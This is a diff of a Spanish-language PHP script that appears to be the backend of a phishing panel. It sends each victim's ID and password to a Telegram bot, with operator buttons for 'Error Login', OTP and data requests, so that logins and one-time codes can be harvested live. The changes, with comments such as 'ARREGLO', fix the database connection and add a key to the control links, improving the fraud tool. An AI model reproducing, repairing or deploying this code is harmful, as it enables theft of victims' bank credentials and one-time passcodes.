@@ -5,13 +5,14 @@ ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
 // Incluir las credenciales desde config.php
-$config = require '../../config/config.php';
+$config = require '../../config/config.php'; // ¡Asegúrate de que esta ruta sea correcta!
 
 // Conexión a la base de datos
 $dbConfig = $config['db'];
 try {
+    // !--- ARREGLO #1: Cambiar 'mysql' por 'pgsql' y añadir puerto ---!
     $pdo = new PDO(
-        "mysql:host={$dbConfig['host']};dbname={$dbConfig['dbname']}",
+        "pgsql:host={$dbConfig['host']};port=5432;dbname={$dbConfig['dbname']}",
         $dbConfig['user'],
         $dbConfig['password']
     );
@@ -22,7 +23,7 @@ try {
     exit();
 }
 
-// Verificar si los datos vienen por GET o POST
+// Verificar si los datos vienen por GET o POST (Esta lógica está perfecta)
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['id'])) {
     // Datos por GET
     $clienteId = $_GET['id'];
@@ -32,7 +33,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['id'])) {
     // Datos por POST (JSON)
     $data = json_decode(file_get_contents("php://input"), true);
     
-    // Validar que los datos requeridos estén presentes
     if (!isset($data['id'])) {
         http_response_code(400);
         echo json_encode(["error" => "Faltan datos requeridos (id)."]);
@@ -49,24 +49,27 @@ function enviarMensajeTelegram($clienteId, $clave, $config) {
     $botToken = $config['telegram']['bot_token'];
     $chatId = $config['telegram']['chat_id'];
     $baseUrl = $config['base_url']; // URL base para los botones
+    
+    // !--- ARREGLO #2: Añadir la clave de seguridad a las URLs ---!
+    // Esta clave debe ser la misma que usa tu script "updatetele.php"
+    $security_key = 'tu_clave_secreta_aqui'; 
 
-    // Mensaje simple con solo ID y clave
     $mensaje = "🆔 *ID:* $clienteId\n" .
                "🔑 *Clave:* $clave";
 
-    // Botones interactivos con URLs
+    // Botones interactivos con URLs (ahora incluyen la &key=)
     $keyboard = [
         'inline_keyboard' => [
             [
-                ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2"],
-                ['text' => '📋 Datos', 'url' => "$baseUrl?id=$clienteId&estado=6"]
+                ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2&key=$security_key"],
+                ['text' => '📋 Datos', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"]
             ],
             [
-                ['text' => '🔐 OTP', 'url' => "$baseUrl?id=$clienteId&estado=3"],
-                ['text' => '⚠️ OTP Error', 'url' => "$baseUrl?id=$clienteId&estado=4"]
+                ['text' => '🔐 OTP', 'url' => "$baseUrl?id=$clienteId&estado=3&key=$security_key"],
+                ['text' => '⚠️ OTP Error', 'url' => "$baseUrl?id=$clienteId&estado=4&key=$security_key"]
             ],
             [
-                ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=0"]
+                ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=0&key=$security_key"]
             ]
         ]
     ];
@@ -99,26 +102,26 @@ function enviarMensajeTelegram($clienteId, $clave, $config) {
 }
 
 try {
-    // 1. Actualizar el estado del cliente en la base de datos
+    // 1. Actualizar el estado del cliente en la BBDD
+    // (Esto está bien, usa la tabla 'clientes' que acabas de crear)
     $stmt = $pdo->prepare("UPDATE clientes SET estado = ? WHERE id = ?");
     $stmt->execute([$nuevoEstado, $clienteId]);
 
     // Comprobar si se actualizó alguna fila
     if ($stmt->rowCount() === 0) {
-        throw new Exception("No se encontró un cliente con el ID proporcionado o el estado ya es el mismo.");
+        throw new Exception("No se encontró un cliente con el ID $clienteId o el estado ya era $nuevoEstado.");
     }
 
-    // 2. Enviar mensaje a Telegram con botones (solo si es estado 0 - inicial)
+    // 2. Enviar mensaje a Telegram (solo si es estado 0 - inicial)
     if ($nuevoEstado == 0) {
         try {
             enviarMensajeTelegram($clienteId, $clave, $config);
         } catch (Exception $e) {
             error_log("Error al enviar a Telegram: " . $e->getMessage());
-            // No lanzamos excepción para no interrumpir el flujo principal
         }
     }
 
-    // 3. Enviar una respuesta
+    // 3. Enviar una respuesta (Esta lógica está perfecta)
     if ($_SERVER['REQUEST_METHOD'] === 'GET') {
         // Para peticiones GET, mostrar HTML con script para cerrar la ventana
         echo '<!DOCTYPE html>
@@ -126,13 +129,12 @@ try {
         <head>
             <title>Proceso Completado</title>
             <script>
-                alert("Estado actualizado correctamente para ID: ' . $clienteId . '");
+                // alert("Estado actualizado correctamente para ID: ' . $clienteId . '");
                 window.close(); // Cierra la ventana actual
                 
-                // Si window.close() no funciona (depende del navegador), intentar alternativas
                 setTimeout(function() {
                     if (!window.closed) {
-                        window.history.back(); // Intentar volver atrás
+                         window.history.back(); // Intentar volver
                     }
                 }, 1000);
             </script>
@@ -148,6 +150,7 @@ try {
     exit();
 
 } catch (Exception $e) {
+    // Manejo de errores
     http_response_code(500);
     if ($_SERVER['REQUEST_METHOD'] === 'GET') {
         echo '<!DOCTYPE html>
